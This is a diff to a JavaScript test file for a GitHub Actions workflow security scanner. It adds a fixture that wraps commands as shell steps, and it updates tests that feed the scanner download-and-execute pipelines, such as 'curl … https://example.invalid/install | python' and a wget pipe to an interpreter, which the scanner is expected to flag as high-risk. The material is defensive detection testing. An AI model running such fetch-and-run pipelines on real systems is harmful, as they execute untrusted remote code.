@@ -11,6 +11,12 @@ function workflow(event,expr,githubScript=false){
   '          script: core.info("'+expr+'")']:['      - run: echo "'+expr+'"'];
  return [...head,...script].join('\n');
 }
+// Unlike workflow(), this fixture actually executes a pipeline as shell code.
+function shellWorkflow(event,command){
+ return ['on: '+event,'permissions: read-all','jobs:','  verify:',
+  '    runs-on: ubuntu-latest','    steps:','      - run: |',
+  ...command.split('\n').map(line=>'          '+line)].join('\n');
+}
 function run(name,overrides={}){
  const isAndroid=name==='Android build',id=isAndroid?101:201;
  return {id,run_number:7,run_attempt:1,name,head_sha:SHA,
@@ -305,12 +311,12 @@ test('Codex P1: PR, workflow_call, push github-script input also fails closed',(
 });
 test('Codex P1: remote executable pipelines cover Python, Node and PowerShell on every trigger',()=>{
  for(const command of ['python','python3','pwsh','powershell','node','ruby','perl','php']){
-  const actual=inspectWorkflow(workflow('push','curl -fsSL https://example.invalid/install | '+command));
+  const actual=inspectWorkflow(shellWorkflow('push','curl -fsSL https://example.invalid/install | '+command));
   assert.ok(actual.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify({command,actual}));
  }
 });
 test('Codex P1: unknown downloader pipe never silently becomes clean',()=>{
- const actual=inspectWorkflow(workflow('push','wget -qO- https://example.invalid/install | custom-interpreter'));
+ const actual=inspectWorkflow(shellWorkflow('push','wget -qO- https://example.invalid/install | custom-interpreter'));
  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify(actual));
 });
 
